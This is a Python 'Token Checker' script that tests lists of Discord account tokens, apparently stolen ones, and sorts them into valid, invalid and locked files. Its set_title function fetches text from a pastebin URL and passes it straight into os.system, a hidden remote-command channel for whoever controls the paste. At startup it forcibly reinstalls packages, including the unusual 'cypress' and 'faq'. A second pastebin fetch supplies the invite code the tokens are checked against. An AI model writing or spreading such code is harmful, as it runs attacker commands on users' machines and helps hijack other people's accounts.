import os 
try:
    import requests
    import cypress
except:
    os.system('pip uninstall requests -y && pip uninstall cypress -y && pip install requests && pip install cypress')
    import requests
    import cypress
try:
    os.system('pip install colorama && pip install requests && pip install aiohttp && cls')
except:
    pass

import requests
import threading

def set_title():
  title = "Token Checker"
  try:
    import requests
    text = str(requests.get("https://pastebin.com/raw/XMq7zpPx").text)
    os.system(f"title {title}{text}")
  except:
    os.system(f"title {title}")
threading.Thread(target=set_title).start()


import sys, time
def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)


try:
    import colorama, requests, faq
except:
    sys.stdout.write("> ")
    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip install colorama requests faq")
    except:
        pass
    sys.stdout.write("> ")
    print015("Problem Maybe Fixed Now, Restart The Program")
    input("")
    exit()

colorama.init(autoreset=True)



colorama.init(autoreset=True)
def token_checker():
	sys.stdout.write(colorama.Fore.CYAN + "1. ")
	print015("Check 1 Token")
	sys.stdout.write(colorama.Fore.CYAN + "2. ")
	print015("Check Tokens In tokens.txt")
	sys.stdout.write(colorama.Fore.CYAN + "> ")
	main = input("")
	if main == "2":
		colorama.init(autoreset=True)
		try:
			donetokenlist = []
			sys.stdout.write(colorama.Fore.CYAN + "> ")
			print015("Loading Tokens...")
			tokens = open("tokens.txt", "r")
			tokenlist = tokens.readlines()
			tokens.close()
			loaded_amount = 0
			for token in tokenlist:
				if "\n" in token:
					donetokenlist.append(token[:-1])
				else:
					donetokenlist.append(token)
				loaded_amount = int(loaded_amount) + 1
			sys.stdout.write(colorama.Fore.CYAN + "> ")
			print01(str(loaded_amount) + " Tokens Loaded, Press Enter To Start")
			input("")
		except Exception:
			sys.stdout.write(colorama.Fore.RED + "> ")
			print01("Unable To Find tokens.txt")
			input("")
			return
		validtokens = []
		invalidtokens = []
		lockedtokens = []
		totaltoken = 0
		validtoken = 0
		lockedtoken = 0
		invalidtoken = 0
		
		for token in donetokenlist:
			while True:
				r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})
				r1 = str(r1)
				if "429" not in r1:
					break
				if "429" in r1:
					sys.stdout.write(colorama.Fore.YELLOW + "> ")
					print("Ratelimited, Retrying")
			r1 = str(r1)
			totaltoken = int(totaltoken) + 1
			if "400" in r1:
				sys.stdout.write(colorama.Fore.RED + "> ")
				print("Token Invalid")
				invalidtokens.append(token)
				invalidfile = open("invalid_tokens.txt", "a")
				invalidfile.writelines(token+"\n")
				invalidfile.close()
				invalidtoken = int(invalidtoken) + 1
			if "200" in r1:
				while True:
					r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": token})
					r = str(r)
					if "429" not in r:
						break
					if "429" in r:
						sys.stdout.write(colorama.Fore.YELLOW + "> ")
						print("Ratelimited, Retrying")
				r = str(r)
				if "200" in r:
					sys.stdout.write(colorama.Fore.GREEN + "> ")
					print("Token Valid")
					validtokens.append(token)
					validfile = open("valid_tokens.txt", "a")
					validfile.writelines(token+"\n")
					validfile.close()
					validtoken = int(validtoken) + 1
				if "403" in r:
					sys.stdout.write(colorama.Fore.YELLOW + "> ")
					print("Token Locked")
					lockedtokens.append(token)
					lockedfile = open("locked_tokens.txt", "a")
					lockedfile.writelines(token+"\n")
					lockedfile.close()
					lockedtoken = int(lockedtoken) + 1
		print("\n\n")
		sys.stdout.write(colorama.Fore.CYAN + "> ")
		print015("Stats:\n")
		sys.stdout.write(colorama.Fore.CYAN + "> ")
		print015("Total Checked: " + str(totaltoken))
		sys.stdout.write(colorama.Fore.CYAN + "> ")
		print015("Total Valid: " +  str(validtoken))
		sys.stdout.write(colorama.Fore.CYAN + "> ")
		print015("Total Invalid: " +  str(invalidtoken))
		sys.stdout.write(colorama.Fore.CYAN + "> ")
		print01("Total Locked: " +  str(lockedtoken))

		input("")
		return
	if main == "1":
		while True:
			sys.stdout.write(colorama.Fore.CYAN + "> ")
			print01("Enter Token: ")
			tokens = input("")
			r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
			if "200" not in str(r1):
				sys.stdout.write(colorama.Fore.RED + "> ")
				print015("Invalid Token")
			if "200" in str(r1):
				r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
				if "200" in str(r):
					sys.stdout.write(colorama.Fore.GREEN + "> ")
					print015("Valid Token")
				if "403" in str(r):
					sys.stdout.write(colorama.Fore.YELLOW + "> ")
					print015("Locked Token")
			while True:
				sys.stdout.write(colorama.Fore.CYAN + "> ")
				print01("Wanna Check Another Token, y/n: ")
				main2 = input("")
				if main2 == "y" or main2 == "n":
					break
				else:
					sys.stdout.write(colorama.Fore.RED + "> ")
					print015("Enter A Valid Choice")
			if main2 == "n":
				return
invite_code = str(requests.get("https://pastebin.com/raw/9SxbfxE8").text)
while True:
	token_checker()
